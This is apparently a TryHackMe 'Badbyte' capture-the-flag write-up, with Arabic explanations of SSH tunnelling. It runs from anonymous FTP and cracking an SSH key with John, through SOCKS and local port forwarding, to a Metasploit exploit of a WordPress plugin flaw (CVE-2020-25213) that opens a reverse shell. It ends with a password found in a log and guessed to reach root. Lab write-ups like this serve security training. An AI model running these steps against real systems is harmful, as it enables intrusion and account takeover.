# TryHackMe Badbyte writeup

``room link``

https://tryhackme.com/room/badbyte
---

``port scan``

```
nmap -sCV 10.10.255.29
```

found **``ssh``** on ``22`` and **``ftp``** on ``30024``

``login ftp using Anonymous``

```
ftp 10.10.231.230 -P 30024
```
found : 
- notes.txt
  ```
  I always forget my password. Just let me store an ssh key here.
  - errorcauser
  ```
- id_rsa

from ``notes.txt`` found that username is ``errorcauser``

**``using john to Crack the passphrase of the private key``**

```
ssh2john id_rsa > rsa_hash.txt
```
```
john rsa_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

<img width="1142" height="293" alt="image" src="https://github.com/user-attachments/assets/ec6ab0b1-c79d-4bd0-a786-3a6ddd4aa0b6" />

password is : ``cupcake``

---

# **`port forwarding`**
=======================

<details>
  <summary>explain</summary>

🧠 الفكرة العامة (ببساطة)
=========================

أنت عندك:

-   🟦 جهازك (Attacker)

-   🟡 سيرفر تقدر تعمل عليه SSH

-   🔴 سيرفر داخلي (فيه Web Server مثلاً)

❌ السيرفر الداخلي مش reachable مباشرة\
✅ لكن تقدر توصله من خلال السيرفر اللي عامل عليه SSH

💥 الحل = **SSH Tunneling**

* * * * *

🔥 أول جزء: Dynamic Port Forwarding (SOCKS Proxy)
=================================================

💡 الفكرة:
----------

بتحول جهازك لـ proxy\
وأي tool (زي nmap) يعدي من خلال السيرفر

* * * * *

✅ الأمر:
--------

```
ssh  -i id_rsa -D  1337 user@target -N
```
### نشرح:

-   `-i id_rsa` → private key

-   `-D 1337` → يعمل SOCKS proxy على بورت 1337

-   `-N` → مش عايزين نفتح shell

💥 كده بقى عندك proxy على:
```
127.0.0.1:1337
```

* * * * *

🧪 تاني خطوة: ProxyChains
=========================

💡 ليه؟
-------

عشان تخلي tools زي nmap تمشي من خلال الـ proxy

* * * * *

✏️ تعديل config:
----------------

افتح:
```
/etc/proxychains.conf
```
### اعمل:

❌ علّق السطر ده:
```
socks4 127.0.0.1 9050
```

✅ ضيف:

```
socks5 127.0.0.1 1337
```

* * * * *

🔍 تالت خطوة: Scan الشبكة الداخلية
==================================

✅ الأمر:
--------

```
proxychains nmap -sT  127.0.0.1
```
💡 هنا:

-   `127.0.0.1` = من وجهة نظر السيرفر

-   يعني بتسكن بورتات السيرفر الداخلي 🔥

* * * * *

💥 النتيجة:
-----------

هتلاقي بورت زي:
```
8080 open
```
👉 ده غالبًا Web Server

* * * * *

🚀 رابع خطوة: Local Port Forwarding
===================================

💡 الهدف:
---------

تفتح البورت ده عندك محليًا

* * * * *

✅ الأمر:
--------

```
ssh  -i id_rsa -L  80:127.0.0.1:8080 user@target
```

### نشرح:

-   `80` → بورت عندك

-   `127.0.0.1:8080` → السيرفر الداخلي

💥 كده:\
أي حاجة تفتحها على:

```
http://localhost
```

هتروح للسيرفر الداخلي 🔥

* * * * *

🧠 الصورة الكبيرة (Flow كامل)
=============================

1.  تعمل SSH بـ `-D`

2.  تستخدم ProxyChains

3.  تعمل scan

4.  تلاقي service

5.  تعمل `-L` forwarding

6.  تفتحها من browser

* * * * *

🔥 ليه ده مهم في الـ Pentesting؟
================================

ده اسمه:\
👉 **Pivoting**

وبيستخدم لما:

-   تدخل شبكة

-   وتلاقي network تانية جوه

-   وتحتاج توصلها

* * * * *

⚠️ أخطاء شائعة
==============

-   تنسى `-N` → يفتح shell مش proxy بس

-   تستخدم `-sS` مع nmap → مش هيشتغل مع proxychains

-   تنسى تعدل proxychains config

* * * * *

💪 مثال واقعي (CTF Style)
=========================

-   دخلت سيرفر SSH

-   لقيت internal admin panel على 8080

-   مش accessible

💥 تعمل:

-   Dynamic proxy

-   Scan

-   Local forward

-   تدخل عليه

* * * * *

🎯 خلاصة الفرق بين الفلاجز
==========================

| Flag | بيعمل إيه |
| --- | --- |
| `-D` | proxy (pivoting) |
| `-L` | تجيب service عندك |
| `-R` | العكس (تطلع حاجة من جهازك للسيرفر) |

-----------------
---------------
-
-------------------
-----------

🧠 تخيل معايا السيناريو
=======================

أنت عندك 3 أجهزة:

```
[ جهازك ]  --->  [ سيرفر SSH ]  --->  [ سيرفر داخلي فيه موقع ]\
 💻             🟡                   🔴
```

### المشكلة:

❌ أنت **مش شايف السيرفر الداخلي (🔴)**\
❌ فيه firewall مانعك توصله مباشرة

### لكن:

✅ السيرفر (🟡) يقدر يشوفه عادي

💥 يبقى الحل:

> "نعدّي من خلال السيرفر (🟡)"

وده اسمه **Pivoting**

* * * * *

🔥 طيب إحنا عملنا إيه؟
======================

🥇 Step 1: عملنا نفق (Tunnel)
-----------------------------

```
ssh  -i id_rsa -D  1337 user@server -N
```

### ده معناه إيه؟

أنت قلت للسيرفر:

> "أي حاجة أبعتها، عدّيها من عندك"

💥 فبقى عندك حاجة اسمها:\
👉 Proxy على `127.0.0.1:1337`

* * * * *

🥈 Step 2: خلّينا الأدوات تستخدم النفق
--------------------------------------

باستخدام ProxyChains

يعني:\
بدل ما `nmap` يشتغل من جهازك ❌\
خليته يشتغل كأنه من السيرفر 🟡 ✅

* * * * *

🥉 Step 3: عملنا Scan
---------------------

```
proxychains nmap -sT  127.0.0.1
```

### هنا أهم نقطة 👇

`127.0.0.1` = **مش جهازك أنت ❌**

💥 دي = السيرفر 🟡

يعني:

> "افحصلي البورتات اللي السيرفر شايفها عنده"

* * * * *

🧨 النتيجة:
-----------

لقيت بورت مفتوح زي:

```
8080
```

👉 ده غالبًا موقع داخلي (🔴)

* * * * *

🤯 طب ليه مش شايفه من عندي؟
===========================

لأن:

-   الموقع شغال على السيرفر الداخلي

-   ومش متاح للعالم الخارجي

* * * * *

🥇 Step 4: جبنا الموقع عندنا
============================

```
ssh  -i id_rsa -L  80:127.0.0.1:8080 user@server
```

### ده معناه:

> "أي حد يدخل عندي على بورت 80\
> وده للسيرفر على 8080"

* * * * *

💥 النتيجة النهائية:
--------------------

تفتح:

```
http://localhost
```

تلاقي:\
👉 الموقع الداخلي اشتغل 😎🔥

  
</details>

## open tannel 

```
ssh  -i id_rsa -D  1337 errorcauser@10.130.136.146 -N
```

<img width="730" height="115" alt="image" src="https://github.com/user-attachments/assets/36809afb-3f1a-4ee2-82f0-5d2228d2c27e" />

## edit ` /etc/proxychains.conf`

```
sudo nano /etc/proxychains.conf
```

```
dynamic_chain
proxy_dns

[ProxyList]
socks5 127.0.0.1 1337
```

<img width="765" height="262" alt="image" src="https://github.com/user-attachments/assets/33fa94d9-413b-4d83-82d1-ed3455429833" />

## scan open ports

```
proxychains nmap -sT 127.0.0.1
```

<img width="1158" height="337" alt="image" src="https://github.com/user-attachments/assets/c6d9e0c3-1120-44b2-a5cd-bca290820039" />

> ### found `80` http and `3306` mysql

## Local Port Forwarding

```
ssh -i id_rsa -L 80:127.0.0.1:80 errorcauser@10.130.136.146
```

<img width="1326" height="463" alt="image" src="https://github.com/user-attachments/assets/d6613830-47cf-40e0-87ff-8eaf06b1ea0e" />

<img width="1399" height="444" alt="image" src="https://github.com/user-attachments/assets/eea6dcd7-9ca4-44f4-8fe8-204270f1dc24" />

```
http://localhost:8080
```

<img width="1879" height="615" alt="image" src="https://github.com/user-attachments/assets/113f086e-c7aa-471f-b1c6-27091f8d3476" />

## nmap scan to find vlun plugins in wordpress

```
nmap -p 8080 \
--script http-wordpress-enum \
--script-args search-limit=1500 \
-vv localhost
```

<img width="1032" height="410" alt="image" src="https://github.com/user-attachments/assets/1c5e18bd-4c54-468f-8151-46a60bf3b971" />

## now use metasploit to exploit this vuln

```
search CVE-2020-25213
use 0
show options
set RHOSTS 127.0.0.1
set RPORT 8080
set lhost tun0
set LPORT 4444
run
```

<img width="1268" height="462" alt="image" src="https://github.com/user-attachments/assets/000621ae-7b80-48ab-82c6-2dac825afad3" />

<img width="1320" height="561" alt="image" src="https://github.com/user-attachments/assets/d40bec8b-5674-4a12-b60c-10129f4c938f" />

```
cat note.txt
```

<img width="1095" height="211" alt="image" src="https://github.com/user-attachments/assets/cceb86e9-60f7-49c6-8177-f17300f151de" />

## found file call **`viminfo`**

<img width="1112" height="298" alt="image" src="https://github.com/user-attachments/assets/895f5958-10f4-4ee3-b018-b2bbc8948fe5" />

## in it found important thing

<img width="1035" height="295" alt="image" src="https://github.com/user-attachments/assets/ce0ecd84-a7f5-4aac-98d8-478b5d4e4aff" />

```
cat /var/log/bash.log
```

<img width="1291" height="372" alt="image" src="https://github.com/user-attachments/assets/deda779d-f380-46ed-8ddf-5d59937ce25b" />

```
cth : G00dP@$sw0rd2020
```

## Note that the password we found has been used last year: we are implied that is the old password, which means the CURRENT password is G00dP@$sw0rd2021 . We can now use it to log in to the root user.

```
G00dP@$sw0rd2021
```

<img width="928" height="276" alt="image" src="https://github.com/user-attachments/assets/1ebc2cb0-7b48-48eb-bcf5-33fd0f6f9cf3" />

<img width="772" height="281" alt="image" src="https://github.com/user-attachments/assets/227cab27-7d22-40a7-8e75-8331d2d771a7" />

## get root flag

<img width="878" height="366" alt="image" src="https://github.com/user-attachments/assets/fa0fd714-2c5b-42e0-a728-ce99c3011e03" />

